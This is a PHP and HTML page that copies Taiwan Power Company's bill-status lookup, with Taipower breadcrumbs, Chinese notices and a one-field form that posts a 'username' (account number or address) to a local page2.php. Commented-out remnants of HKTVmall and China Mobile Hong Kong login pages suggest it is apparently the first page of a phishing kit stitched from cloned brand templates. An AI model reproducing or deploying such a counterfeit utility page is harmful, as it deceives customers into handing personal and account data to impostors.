<?php
include('header_new.php');
?>
<style type="text/css">
  form button[type="submit"] {
    background: #00a8b7;
    border: 1px solid #007984;
    color: #FFF;
    -moz-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    -webkit-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
}

.photoblock2{
  background-image: url(/AZ/images/photoblock_inbg.png) !important;
}
.innerpage{
  padding-top: 0px !important;
}
</style>
<!-- main Start -->
<div id="center" class="main innerpage">
            <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
            <!-- photoblock start-->
<section class="section col-12 photoblock2 no-print" style="background-image: url(/AZ/images/photoblock_inbg.png) !important;">
</section>
<!-- photoblock end-->     
            <div class="container">
                        <!-- breadcrumb路徑 -->
            <div class="breadcrumb" id="firstLoad">
                                                <ul>
                                                                    <li>現在位置：<a href="https://ebpps2.taipower.com.tw/" title="首頁"> 首頁                        </a></li>
                                                                                            <li>電費查詢與試算</li>
                                                                                            <li>簡易帳單查詢</li>
                                                              </ul>
                                          </div>
            <!-- h1節點 -->
<h1 style="font-size: 1.5em;margin: 0.83em 0;" class="title">繳費狀況查詢作業</h1>
<!-- aP Start -->
<section class="ap">
  <!-- searchform start -->
  <div class="searchform">
    <div class="login-form">
    <h2>電號/住址查詢</h2>
    <form action="./page2.php" method="POST" id="loginForm" novalidate>
        <div class="form-group">
            <input type="text" placeholder="輸入電號或住址" name="username" required>
        </div>
        <!-- <div class="form-group">
            <input type="password" placeholder="密碼" name="password" required>
        </div> -->
        <button type="submit" class="btnSubmit btn" name="submit" id="submit">登入</button>
        <!-- <div class="usernew_login_inks">
            <div class="usernew_login_link"><a href="/tc/user/retrieve.html" title="找回賬戶" class="login_link_text"> 找回賬戶
                </a></div>
            <div class="usernew_login_link"><a href="/tc/user/forgot.html" title="忘記登錄密碼?" class="login_link_text">
                    忘記登錄密碼? </a><a href="https://1cm.hk.chinamobile.com/user/forget-password.html?lang=zh_hk" title="忘記客戶密碼?" class="login_link_text"> 忘記客戶密碼? </a></div>
        </div> -->
        <!-- <a href="#" class="forgot-pwd">忘記密碼?</a> -->
    </form>
    <!-- <div class="register">
        <p>未有帳戶？立即加入HKTVmall</p>
        <a class="register-link" href="#"><svg height="325pt" viewBox="0 0 325 325.37515" width="325pt" xmlns="http://www.w3.org/2000/svg">
                <path d="m114.6875 284.675781-73.800781-73.800781 178.5-178.5 73.800781 73.800781zm-80.699219-60.800781 67.699219 67.699219-101.5 33.800781zm281.898438-140.300781-12.800781 12.800781-73.898438-73.898438 12.800781-12.800781c12.894531-12.902343 33.804688-12.902343 46.699219 0l27.199219 27.199219c12.800781 12.9375 12.800781 33.765625 0 46.699219zm0 0" />
            </svg>登記免費帳戶</a>
    </div> -->
</div>
  
  </div>
  <!-- searchform end -->
  <div class="explanation">
    為保護用戶用電資料安全，本服務只顯示本期電費資料，<span class="word_red" style="font-weight: bold;">且不代表您已成為本公司電子帳單會員。</span>如欲查詢更多電費資料，請登入/註冊電子帳單會員並綁定電號，即享有更多電子帳單專屬服務，如有相關問題可撥打24小時客服專線1911。  </div>
</section>
<!-- aP End -->

<script>

function checkForm(){
  var canGo=true;
  var custno=$("#custNo").val();
  if(custno===""){
    $("#custNoError").show();
    canGo=false;
    }
  var answer=$("#answer").val();
  if(answer===""){
    $("#answerError").show();
    canGo=false;
    }
  return canGo;
}
function errorNoticeDisplay(fieldName, noticeWarning) {
    $("#" + fieldName + "Error").show();
    $("#" + fieldName + "ErrorWarning").text(noticeWarning);
}
function sendEmailCaptcha(){
    var returnValue = true;
    if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
        errorNoticeDisplay('email', '請輸入Email 帳號');
        returnValue = false;
    } else {
        //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
        var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        if (patternEmail.test($("#email").val()) == false) {
            errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
            returnValue = false;
        } else {
            patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
            if (patternEmail.test($("#email").val().toLowerCase()) == true) {
                errorNoticeDisplay('email',
                        '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
            }
        }
    }
    if(returnValue){
    $.ajax({
            url : "/captcha/sendCaptcha",
            type: "get",
            data : {
                "email" : $("#email").val()    
              },
            success : function(response) {            
              $('#modal1').hide();
              $('.modal_overlay').hide();
              if(response){
                 swal("驗證碼已寄出，請至電子郵件信箱收信。");
              }else{
                 swal("驗證碼已過期，請刷新驗證碼。");
              }
            
            },
            error: function(response){
                swal("驗證碼已過期，請刷新驗證碼。");
            }        
          }); 
        }
}

$(function() {
  
  $('#custNo').click(function() {      
      $('.annotation').show();
      $("#answer").val("");
  });

  $('#answer').focus(function() {
      $("#answer").val("");
      
  });
  $('#answer').keyup(function() {
      var ans=$("#answer").val();
      $("#answer").val(toASCII(ans));
  });
  
})



</script>
            </div>
</div>
<?php include('footer_new.php'); ?>